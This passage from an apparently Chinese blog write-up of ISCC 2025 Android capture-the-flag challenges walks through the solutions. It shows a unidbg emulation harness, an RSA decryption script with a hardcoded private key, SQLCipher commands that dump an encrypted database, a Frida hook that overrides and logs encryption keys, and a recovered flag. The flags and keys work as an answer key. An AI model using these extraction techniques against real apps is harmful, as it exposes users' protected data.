class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.ISCC;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.util.IOUtils;<br><span class="hljs-keyword">import</span> com.github.unidbg.AndroidEmulator;<br><span class="hljs-keyword">import</span> com.github.unidbg.Module;<br><span class="hljs-keyword">import</span> com.github.unidbg.arm.backend.Unicorn2Factory;<br><span class="hljs-keyword">import</span> com.github.unidbg.debugger.Debugger;<br><span class="hljs-keyword">import</span> com.github.unidbg.linux.android.AndroidEmulatorBuilder;<br><span class="hljs-keyword">import</span> com.github.unidbg.linux.android.AndroidResolver;<br><span class="hljs-keyword">import</span> com.github.unidbg.linux.android.dvm.*;<br><span class="hljs-keyword">import</span> com.github.unidbg.memory.Memory;<br><br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.FileNotFoundException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">chal</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractJni</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> AndroidEmulator emulator;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> VM vm;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Module <span class="hljs-keyword">module</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> DvmClass swan, pig;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> logging;<br><br>    chal(<span class="hljs-type">boolean</span> logging) <span class="hljs-keyword">throws</span> FileNotFoundException &#123;<br>        <span class="hljs-built_in">this</span>.logging = logging;<br>        emulator = AndroidEmulatorBuilder.for64Bit()<br>                .setProcessName(<span class="hljs-string">&quot;com.twogoat.114514&quot;</span>)<br>                .addBackendFactory(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Unicorn2Factory</span>(<span class="hljs-literal">true</span>))<br>                .build(); <span class="hljs-comment">// 创建模拟器实例，要模拟32位或者64位，在这里区分</span><br>        <span class="hljs-keyword">final</span> <span class="hljs-type">Memory</span> <span class="hljs-variable">memory</span> <span class="hljs-operator">=</span> emulator.getMemory(); <span class="hljs-comment">// 模拟器的内存操作接口</span><br>        memory.setLibraryResolver(<span class="hljs-keyword">new</span> <span class="hljs-title class_">AndroidResolver</span>(<span class="hljs-number">23</span>)); <span class="hljs-comment">// 设置系统类库解析</span><br>        vm = emulator.createDalvikVM(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;\\mo3.apk&quot;</span>)); <span class="hljs-comment">// 创建Android虚拟机</span><br>        vm.setVerbose(logging); <span class="hljs-comment">// 设置是否打印Jni调用细节</span><br>        vm.setJni(<span class="hljs-built_in">this</span>);<br>        <span class="hljs-type">DalvikModule</span> <span class="hljs-variable">dm</span> <span class="hljs-operator">=</span> vm.loadLibrary(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;G:\\text\\new\\unidbg-0.9.8\\unidbg-0.9.8\\unidbg-android\\src\\test\\java\\com\\ISCC\\libswan.so&quot;</span>), <span class="hljs-literal">false</span>); <span class="hljs-comment">// 加载libttEncrypt.so到unicorn虚拟内存，加载成功以后会默认调用init_array等函数</span><br>        <span class="hljs-keyword">module</span> = dm.getModule(); <span class="hljs-comment">// 加载好的libttEncrypt.so对应为一个模块</span><br>        <span class="hljs-type">Debugger</span> <span class="hljs-variable">attach</span> <span class="hljs-operator">=</span> emulator.attach();<br>        attach.addBreakPoint(<span class="hljs-keyword">module</span>.base + <span class="hljs-number">0x0000000000021B04</span>);<br>        dm.callJNI_OnLoad(emulator); <span class="hljs-comment">// 手动执行JNI_OnLoad函数</span><br>        <span class="hljs-comment">//attach.addBreakPoint(module.base + 0x24188);</span><br>        <span class="hljs-comment">// emulator.traceCode(module.base, module.base + 0x0000000000063290).setRedirect(traceStream);</span><br>        swan = vm.resolveClass(<span class="hljs-string">&quot;com/example/mobile03/swan&quot;</span>);<br>        pig = vm.resolveClass(<span class="hljs-string">&quot;pig&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">chal</span><span class="hljs-params">(AndroidEmulator emulator, VM vm, Module <span class="hljs-keyword">module</span>, DvmClass mMainActivity, DvmClass swan, DvmClass pig, <span class="hljs-type">boolean</span> logging)</span> &#123;<br>        <span class="hljs-built_in">this</span>.emulator = emulator;<br>        <span class="hljs-built_in">this</span>.vm = vm;<br>        <span class="hljs-built_in">this</span>.<span class="hljs-keyword">module</span> = <span class="hljs-keyword">module</span>;<br>        <span class="hljs-built_in">this</span>.swan = swan;<br>        <span class="hljs-built_in">this</span>.pig = pig;<br>        <span class="hljs-built_in">this</span>.logging = logging;<br>    &#125;<br><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>        IOUtils.close(emulator);<br>        <span class="hljs-keyword">if</span> (logging) &#123;<br>            System.out.println(<span class="hljs-string">&quot;destroy&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">chal</span> <span class="hljs-variable">test</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">chal</span>(<span class="hljs-literal">true</span>);<br>        test.ttEncrypt();<br>        test.destroy();<br>    &#125;<br><br>    <span class="hljs-type">boolean</span> <span class="hljs-title function_">ttEncrypt</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">text</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quotquot;</span>;<br>        <span class="hljs-comment">// String res = String.valueOf(swan.callStaticJniMethodObject(emulator, &quot;getPvKey()Ljava/lang/String;&quot;, text));</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> String.valueOf(swan.callStaticJniMethodObject(emulator, <span class="hljs-string">&quot;getPvKey()Ljava/lang/String;&quot;</span>, text));<br>        System.out.println(res); <span class="hljs-comment">// 执行Jni方法</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>![屏幕截图 2025-05-06 171133](&#x2F;images&#x2F;ISCC-2025-APP&#x2F;屏幕截图 2025-05-06 171133.png)</p><p><img src="/images/ISCC-2025-APP/image-20250506171959198.png" alt="image-20250506171959198"></p><p>RSA解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">from</span> Crypto.PublicKey <span class="hljs-keyword">import</span> RSA<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> PKCS1_v1_5<br><br><span class="hljs-comment"># —— 1. 私钥 PEM —— </span><br>PRIVATE_KEY_PEM = <span class="hljs-string">&quot;&quot;&quot;-----BEGIN RSA PRIVATE KEY-----</span><br><span class="hljs-string">MIIBOwIBAAJBAIKa+PyzKgc3gZWuATRVoU4MC7yt5ArqgWm1Cf5L2qFnc3vya1yP</span><br><span class="hljs-string">hqS9JxQmZxHfB4DvfmR3lfRrbLrxEmrTRu8CAwEAAQJAUe6YTiazMe3PPC/5j3Q8</span><br><span class="hljs-string">ifKilk3cJkDwyHiK+V1qnR+b6Srh7FTyT+yS7HZgOUlVdw9rtpEBCUya87stHNs6</span><br><span class="hljs-string">cQIhAMP9EzynijUGydiu04vwz1RP8eLdY6gJwsa0CffI9QDpAiEAqpi2zS0kQv9WX</span><br><span class="hljs-string">LeSILo/hdu1vWnlFotSyVSa/txfYhcCIQCtyX5CXYnXBWL8ieG6CFnAOHeTpJ6Wxb</span><br><span class="hljs-string">j6O3FPT9m46QIhAKE2Z6lE+3uEqCw+HY1n9BefJQO2SpMfXkB7/2zQ/CJJAiBi00</span><br><span class="hljs-string">BtWEIJak5AWXSBTQM2lRotqhV8XVfHDuT6xM688A==</span><br><span class="hljs-string">-----END RSA PRIVATE KEY-----&quot;&quot;&quot;</span><br><br><span class="hljs-comment"># —— 2. 待解密的十六进制密文（TARGET）——</span><br>TARGET_HEX = (<br>    <span class="hljs-string">&quot;06fd1efdf350f67f35825a92b4bf612ba33234a92dba2f47df7c80dfedc4a93a5&quot;</span><br>    <span class="hljs-string">&quot;5f4c8f3959d77cd866e6c0d7bfa2a5b63feb2a60fdc18df434f3fbeb0fa643c&quot;</span><br>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-comment"># 导入私钥</span><br>    rsa_key = RSA.import_key(PRIVATE_KEY_PEM)<br>    cipher = PKCS1_v1_5.new(rsa_key)<br><br>    <span class="hljs-comment"># 十六进制 → 字节</span><br>    ciphertext = binascii.unhexlify(TARGET_HEX)<br><br>    <span class="hljs-comment"># 解密（第二个参数为 None 时，解密失败会抛出 ValueError）</span><br>    <span class="hljs-keyword">try</span>:<br>        plaintext = cipher.decrypt(ciphertext, <span class="hljs-literal">None</span>)<br>    <span class="hljs-keyword">except</span> ValueError:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;解密失败：可能密文或私钥不匹配&quot;</span>)<br>        <span class="hljs-keyword">return</span><br><br>    <span class="hljs-comment"># 输出明文</span><br>    <span class="hljs-keyword">try</span>:<br>        flag = plaintext.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    <span class="hljs-keyword">except</span> UnicodeDecodeError:<br>        flag = plaintext  <span class="hljs-comment"># 若不是 UTF-8 文本，则直接打印 bytes</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;解密得到的 flag：&quot;</span>, flag)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>拼接前半部分flag</p><h1 id="ISCC区域赛"><a href="#ISCC区域赛" class="headerlink" title="ISCC区域赛"></a><strong>ISCC区域赛</strong></h1><h2 id="mobile1-1"><a href="#mobile1-1" class="headerlink" title="mobile1"></a><strong>mobile1</strong></h2><p>1.获取db密钥</p><p><img src="/images/ISCC-2025-APP/image-20250510172205867.png" alt="image-20250510172205867"></p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">VlROQ2FHTnRkSE5hVVQwOQ</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><br></code></pre></td></tr></table></figure><p>三次base64解密后 db密钥：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">Sparkle</span><br></code></pre></td></tr></table></figure><h1 id="这里记录一下sqlcipher简单使用教程"><a href="#这里记录一下sqlcipher简单使用教程" class="headerlink" title="这里记录一下sqlcipher简单使用教程"></a><strong>这里记录一下sqlcipher简单使用教程</strong></h1><p>使用sqlcipher-shell32.exe解密db</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-comment">-- 查询 SQLCipher 版本</span><br>sqlite&gt; <span class="hljs-keyword">PRAGMA</span> cipher_version;     <br><span class="hljs-number">3.0</span>.<span class="hljs-number">1</span><br><span class="hljs-comment">--密钥</span><br>sqlite&gt; <span class="hljs-keyword">PRAGMA</span> key = <span class="hljs-symbol">&#x27;Sparkle</span>&#x27;;<br><span class="hljs-comment">--指定兼容性</span><br>sqlite&gt; <span class="hljs-keyword">PRAGMA</span> cipher_compatibility = <span class="hljs-number">3</span>;<br><span class="hljs-comment">-- 执行完整性检查</span><br>sqlite&gt; <span class="hljs-keyword">PRAGMA</span> integrity_check;<br>ok<br><span class="hljs-comment">--附加一个新的、空白的“明文”数据库</span><br>sqlite&gt; ATTACH DATABASE &#x27;<span class="hljs-number">66666</span>.db&#x27; AS plaintext KEY &#x27;&#x27;;<br><span class="hljs-comment">-- 导出所有数据到明文数据库</span><br>sqlite&gt; <span class="hljs-keyword">SELECT</span> sqlcipher_export(<span class="hljs-symbol">&#x27;plaintext</span>&#x27;);<br></code></pre></td></tr></table></figure><p>使用Navicat打开新db</p><p><img src="/images/ISCC-2025-APP/image-20250510183821939.png" alt="image-20250510183821939"></p><p>获得密钥key</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">T0uVwXyZAbCdEfGh<br></code></pre></td></tr></table></figure><p>2.hook</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-comment">// 主 hook 函数，用于拦截关键方法</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">hook</span>(<span class="hljs-params"></span>) &#123;<br>    Java.perform(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;开始执行 hook...&quot;</span>);<br>        <br>        <span class="hljs-comment">// 1. 拦截 com.example.mobile01.b 类中的 c 方法</span><br>       <span class="hljs-comment">// 返回关键字符串</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            let b = Java.use(<span class="hljs-string">&quot;com.example.mobile01.b&quot;</span>);<br>            b[<span class="hljs-string">&quot;c&quot;</span>].implementation = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>                <span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;[*] 方法 com.example.mobile01.b.c() 被调用，返回固定值&quot;</span>);<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;T0uVwXyZAbCdEfGh&quot;</span>;<br>            &#125;;<br>            <span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;[+] 成功 hook com.example.mobile01.b.c() 方法&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>            <span class="hljs-built_in">console</span>.error(<span class="hljs-string">&quot;[-] 无法 hook com.example.mobile01.b.c():&quot;</span>, e);<br>        &#125;<br>        <br>        <span class="hljs-comment">// 2. 拦截 DESHelper 类的 encrypt 方法，记录加密参数和结果</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            let DESHelper = Java.use(<span class="hljs-string">&quot;com.example.mobile01.DESHelper&quot;</span>);<br>            DESHelper[<span class="hljs-string">&quot;encrypt&quot;</span>].implementation = <span class="hljs-keyword">function</span> (<span class="hljs-params">str, str2, str3</span>) &#123;<br>                <span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">`[*] DESHelper.encrypt 被调用: 明文=<span class="hljs-subst">$&#123;str&#125;</span>, 密钥=<span class="hljs-subst">$&#123;str2&#125;</span>, 向量=<span class="hljs-subst">$&#123;str3&#125;</span>`</span>);<br>                <br>                <span class="hljs-comment">// 调用原始方法进行加密</span><br>                let result = this[<span class="hljs-string">&quot;encrypt&quot;</span>](str, str2, str3);<br>                <br>                <span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">`[*] DESHelper.encrypt 加密结果=<span class="hljs-subst">$&#123;result&#125;</span>`</span>);<br>                <span class="hljs-keyword">return</span> result;<br>            &#125;;<br>            <span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;[+] 成功 hook DESHelper.encrypt() 方法&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>            <span class="hljs-built_in">console</span>.error(<span class="hljs-string">&quot;[-] 无法 hook DESHelper.encrypt():&quot;</span>, e);<br>        &#125;<br>    &#125;);<br>&#125;<br><br><span class="hljs-comment">// 在 JavaScript 事件循环的下一次迭代中执行 hook 函数</span><br><span class="hljs-comment">// 确保在 Java 环境完全初始化后再执行</span><br>setImmediate(hook);<br></code></pre></td></tr></table></figure><p><img src="/images/ISCC-2025-APP/image-20250512121712561.png" alt="image-20250512121712561"></p><p>ISCC{kFV+vQCmogNraCLWryVlHqbByvGfZewL}</p><h2 id="mobile2-1"><a href="#mobile2-1" class="headerlink" title="mobile2"></a><strong>mobile2</strong></h2><p>使用 jadx分析apk文件</p><p>解密脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">_hex_from_cipher</span>(<span class="hljs-params">cipher: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;A.c 的逆操作：字符 ➜ 4 位十六进制，去掉前导 &#x27;00&#x27;&quot;&quot;&quot;</span><br>    hex_str = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">ord</span>(ch):04x&#125;</span>&#x27;</span> <span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> cipher)<br>    <span class="hljs-keyword">return</span> hex_str[<span class="hljs-number">2</span>:] <span class="hljs-keyword">if</span> hex_str.startswith(<span class="hljs-string">&#x27;00&#x27;</span>) <span class="hljs-keyword">else</span> hex_str<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">_undo_padding</span>(<span class="hljs-params">hex_str: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    逆操作：去掉每 2 位后强插的 &#x27;00&#x27;（若剩余长度 %4 == 2 说明末尾少一个 &#x27;00&#x27;），</span><br><span class="hljs-string">    得到插针/交换前的串 replaced</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(hex_str) % <span class="hljs-number">4</span> == <span class="hljs-number">2</span>:<br>        hex_str += <span class="hljs-string">&#x27;00&#x27;</span>  <span class="hljs-comment"># 还原被截掉的最后两个 0</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(hex_str[i:i + <span class="hljs-number">2</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(hex_str), <span class="hljs-number">4</span>))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">_undo_pair_shuffle</span>(<span class="hljs-params">replaced: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    逆操作：解析 2-字节或 4-字节(…&#x27;21&#x27;) 片段，复原 sb2+sb 的顺序</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    out, i = [], <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> i &lt; <span class="hljs-built_in">len</span>(replaced):<br>        <span class="hljs-comment"># 4 字节模式：c2 c1 2 1</span><br>        <span class="hljs-keyword">if</span> i + <span class="hljs-number">3</span> &lt; <span class="hljs-built_in">len</span>(replaced) <span class="hljs-keyword">and</span> replaced[i + <span class="hljs-number">2</span>:i + <span class="hljs-number">4</span>] == <span class="hljs-string">&#x27;21&#x27;</span>:<br>            c2, c1 = replaced[i], replaced[i + <span class="hljs-number">1</span>]<br>            out.extend([c1, c2])<br>            i += <span class="hljs-number">4</span><br>        <span class="hljs-keyword">else</span>:  <span class="hljs-comment"># 2 字节保持原序</span><br>            out.extend(replaced[i:i + <span class="hljs-number">2</span>])<br>            i += <span class="hljs-number">2</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(out)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">_split_and_fix_zero</span>(<span class="hljs-params">concat: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    按 sb2 | sb 切分，再把被替换成 &#x27;3&#x27; 的零位改回 &#x27;0&#x27;。</span><br><span class="hljs-string">    sb 负责偶数索引（0,2,4…），替换条件  idx==0 或 idx%3==0</span><br><span class="hljs-string">    sb2 负责奇数索引（1,3,5…），替换条件  idx==1 或 (idx-1)%3==0</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    half = <span class="hljs-built_in">len</span>(concat) // <span class="hljs-number">2</span><br>    sb2, sb = concat[:half], concat[half:]<br><br>    <span class="hljs-comment"># sb 复原 0 → 3</span><br>    sb = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">if</span> ch == <span class="hljs-string">&#x27;3&#x27;</span> <span class="hljs-keyword">and</span> (idx == <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> idx % <span class="hljs-number">3</span> == <span class="hljs-number">0</span>) <span class="hljs-keyword">else</span> ch<br>                 <span class="hljs-keyword">for</span> idx, ch <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(sb))<br>    <span class="hljs-comment"># sb2 复原 0 → 3</span><br>    sb2 = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">if</span> ch == <span class="hljs-string">&#x27;3&#x27;</span> <span class="hljs-keyword">and</span> (idx == <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> (idx - <span class="hljs-number">1</span>) % <span class="hljs-number">3</span> == <span class="hljs-number">0</span>) <span class="hljs-keyword">else</span> ch<br>                  <span class="hljs-keyword">for</span> idx, ch <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(sb2))<br><br>    <span class="hljs-comment"># 交叉还原到原 16 进制序列</span><br>    res = []<br>    even = odd = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> idx <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(concat)):<br>        <span class="hljs-keyword">if</span> idx % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>:  <span class="hljs-comment"># 偶数位来自 sb</span><br>            res.append(sb[even]);<br>            even += <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:  <span class="hljs-comment"># 奇数位来自 sb2</span><br>            res.append(sb2[odd]);<br>            odd += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(res)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">_hex_to_plain</span>(<span class="hljs-params">hex_str: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    根据 A.b 的编码规则：</span><br><span class="hljs-string">    - 如果以 &#x27;0&#x27; 开头则为 3 位组 (0xx) ➜ ASCII/单字节</span><br><span class="hljs-string">    - 否则为 4 位组 ➜ Unicode (xxxx)</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    out, i = [], <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> i &lt; <span class="hljs-built_in">len</span>(hex_str):<br>        <span class="hljs-keyword">if</span> hex_str[i] == <span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">and</span> i + <span class="hljs-number">2</span> &lt; <span class="hljs-built_in">len</span>(hex_str):<br>            out.append(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(hex_str[i + <span class="hljs-number">1</span>:i + <span class="hljs-number">3</span>], <span class="hljs-number">16</span>)))<br>            i += <span class="hljs-number">3</span><br>        <span class="hljs-keyword">else</span>:<br>            out.append(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(hex_str[i:i + <span class="hljs-number">4</span>], <span class="hljs-number">16</span>)))<br>            i += <span class="hljs-number">4</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(out)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">cipher: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;顶层接口：密文 ➜ 明文&quot;&quot;&quot;</span><br>    step1 = _hex_from_cipher(cipher)<br>    step2 = _undo_padding(step1)<br>    step3 = _undo_pair_shuffle(step2)<br>    step4 = _split_and_fix_zero(step3)<br>    <span class="hljs-keyword">return</span> _hex_to_plain(step4)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-comment"># 示例：使用XOR密钥解密并展示最终结果</span><br>    xor_key = [<span class="hljs-number">0x53</span>, <span 